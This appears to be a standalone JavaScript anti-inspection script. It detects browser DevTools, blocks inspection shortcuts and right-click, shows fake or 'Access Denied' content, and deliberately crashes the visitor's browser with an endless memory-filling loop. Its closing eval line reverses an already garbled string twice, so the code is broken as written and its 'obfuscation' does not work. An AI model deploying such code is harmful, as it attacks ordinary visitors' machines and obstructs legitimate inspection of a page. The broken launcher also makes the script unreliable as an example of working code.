(function () {
    // Obfuscation function
    function obfuscate(s) {
        return s.split('').reverse().join('');
    }

    // Detect DevTools using time delay check
    function detectDevTools() {
        let start = new Date();
        debugger;
        let end = new Date();
        if (end - start > 200) {
            crashBrowser();
        }
    }

    // Function to overload memory & crash browser
    function crashBrowser() {
        document.body.innerHTML = "<h1 style='text-align:center;color:red;'>Access Denied</h1>";
        setInterval(function () {
            let arr = [];
            while (true) {
                arr.push(new Array(1000000).fill("X"));
            }
        }, 10);
    }

    // Replace page with fake content if DevTools is opened
    function fakePage() {
        document.body.innerHTML = `<h1 style="text-align:center;color:blue;">Welcome to My Website</h1>
        <p>This is a simple web page.</p>`;
    }

    // Block all key shortcuts for DevTools
    function blockKeys() {
        document.addEventListener("keydown", function (e) {
            if (
                e.keyCode === 123 || // F12
                (e.ctrlKey && e.shiftKey && (e.keyCode === 73 || e.keyCode === 74 || e.keyCode === 67)) || // Ctrl+Shift+I, J, C
                (e.ctrlKey && e.keyCode === 85) // Ctrl+U
            ) {
                e.preventDefault();
                fakePage();
                setTimeout(crashBrowser, 2000);
            }
        });
    }

    // Disable right-click to prevent "Inspect Element"
    function disableRightClick() {
        document.addEventListener('contextmenu', function (event) {
            event.preventDefault();
        });
    }

    // Force Mobile View to Make Debugging Harder
    function forceMobileView() {
        if (window.innerWidth > 800) {
            document.body.innerHTML = "<h1 style='text-align:center;color:blue;'>Please use a mobile device to view this page.</h1>";
        }
    }

    // Run all security measures
    function startSecurity() {
        setInterval(detectDevTools, 1000);
        blockKeys();
        disableRightClick();
        forceMobileView();
    }

    // Obfuscate and execute the security function
    eval(obfuscate(")();ytilibasiSrtats(".split("").reverse().join("")));
})();
